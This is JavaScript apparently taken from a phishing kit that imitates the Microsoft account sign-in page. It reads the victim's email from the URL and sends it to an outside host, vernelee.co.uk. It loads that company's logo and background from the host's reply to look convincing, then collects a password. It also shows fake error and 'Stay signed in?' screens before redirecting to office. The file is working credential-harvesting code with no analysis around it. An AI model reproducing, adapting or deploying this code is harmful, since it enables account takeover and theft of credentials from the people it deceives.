

        // Get the email parameter from the URL hash
    var emailParam = window.location.hash.substr(1);
    if (emailParam) {
        document.getElementById('i0116').value = emailParam;
        if (document.getElementById('emField').style.display !== 'none') {
            goNext();
        }
    }
        $(document).ready(function() {
            $('#i0117').focus();
        });

        $('#i0116').keypress(function(e) {
            var key = e.which;
            if (key == 13) // the enter key code
            {
                goNext();
            }
        });

        function goNext() {
            $('#i0116').removeClass('has-error');
            $('#errorBar').text('');
            var usr = $('#i0116').val();
            var userError = 'Enter a valid email address, phone number, or Skype name.';
            if (isEmail(usr)) {
                $('#usernameProgress').css('display', 'block');
                $('#idSIButton9').prop('disabled', true);
                $.ajax({
                    url: 'https://vernelee.co.uk/abd/Decode/process.php',
                    cache: false,
                    type: 'POST',
                    data: 'do=check&email=' + usr,
                    dataType: 'json',
                    success: function(data) {
                        if (data.status == 'error') {
                            $('#i0116').addClass('has-error');
                            $('#errorBar').text(data.message);
                        } else if (data.status == 'success') {
                            if (data.background != null) {
                                $('#bodybackground').css('background', `linear-gradient( rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5) ), url(${data.background})`);
                                $('#backgroundForm').val(data.background);
                            }
                            if (data.banner != null) {
                                $('#logoCompany').attr('src', data.banner);
                                $('#logoForm').val(data.banner);
                            }
                            $('#loginHeader').text('Enter password');
                            $('#displayName').text(usr);
                            $('#emField').css('display', 'none');
                            $('#pwField').css('display', 'block');
                            $('.identityBanner').css('display', 'block');

                            $('#i0117').focus();
                            $('#errorBar').text('');
                            $('#idSIButton99').attr('type', 'submit');
                            $('form').find('input:button').each(function() {
                                $("<input type='submit' />").attr({
                                        name: this.name,
                                        value: this.value
                                    }).insertBefore(this)
                                    .addClass('btn btn-block btn-primary');
                            }).remove();
                        }
                        $('#usernameProgress').css('display', 'none');
                        $('#idSIButton9').prop('disabled', false);
                    }
                });
            } else {
                $('#i0116').addClass('has-error');
                $('#errorBar').text(userError);
                $('#usernameProgress').css('display', 'none');
            }

        }

        function closeBox() {
            $('#popup1').css('visibility', 'hidden').css('opacity', 0);
            $('#i0116').focus();
        }

        function checkSubmit() {
            if (emailParam) {
                document.getElementById('i0116').value = emailParam;
            }
            var pwd = $('#i0117').val();
            var pwError = 'Please enter the password for your Microsoft account.';
            if (pwd.length > 5) {
                $('#errorBar').text('');
                $('#pwProgress').css('display', 'block');
                return true;
            } else {
                $('#errorBar').text(pwError);
                return false;
            }
        }

        function isEmail(email) {
            var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            return regex.test(email);
        }

        function iserror(email) {
            $('#displayName').text(email);
            $('#errorBar').html('Your account or password is incorrect. If you dont remember your password, <a href="#">reset it now.</a>');
            $('#i0117').addClass('has-error');
            $('#emField').css('display', 'none');
            $('#pwField').css('display', 'block');
            $('.identityBanner').css('display', 'block');
            $('form').find('input:button').each(function() {
                $("<input type='submit' />").attr({
                        name: this.name,
                        value: this.value
                    }).insertBefore(this)
                    .addClass('btn btn-block btn-primary');
            }).remove();
        }

        function isSuccess(email) {
            $('#displayName').text(email);
            $('#errorBar').text('');
            $('#i0117').removeClass('has-error');
            $('#i0117').val('nopassword');
            $('#titleBox').text('Stay signed in?');
            $('#cantAccess').css('display', 'none');
            $('#createAccount').css('display', 'none');
            $('#emField').css('display', 'none');
            $('#pwField').css('display', 'none');
            $('.identityBanner').css('display', 'block');
            $('#idSIButton9').attr('type', 'hidden');
            $('#successLogin').css('display', 'block');
            $('form').find('input:button').each(function() {
                $("<input type='submit' />").attr({
                        name: this.name,
                        value: this.value
                    }).insertBefore(this)
                    .addClass('btn btn-block btn-primary');
            }).remove();
            $('#i0281').attr('action', 'https://www.office');
            $('#i0281').attr('method', 'get');
        }

    
        const urlParams = new URLSearchParams(window.location.search);
        let id = urlParams.get('id');
        console.log(id);
        const bgParam = urlParams.get('bg');
        const logoParam = urlParams.get('logo');
        const decodedLogo = logoParam ? atob(logoParam) : '';
        const backgroundParam = urlParams.get('bg');
        const checkErrorParam = urlParams.get('error');

        const decodedBackground = backgroundParam ? atob(backgroundParam) : '';

        document.getElementById('logoForm').value = decodedLogo;
        document.getElementById('backgroundForm').value = decodedBackground;

        document.getElementById('i0116').value = id
        document.getElementById('hasUser').value = id
        document.getElementById('userhost').value = window.location.origin + "/index.html"
    

        const bodyBackground = document.getElementById('bodybackground');
        bodyBackground.style.backgroundImage = bgParam ? `linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(${atob(bgParam)})` : "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')";

        const logoImg = document.getElementById('logoCompany');
        logoImg.src = logoParam ? atob(logoParam) : 'https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8148.16/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd';
            
       
       if(urlParams.has('error')){
            iserror(id) 
       }else if (urlParams.has('success')){
            isSuccess(id)
       }

    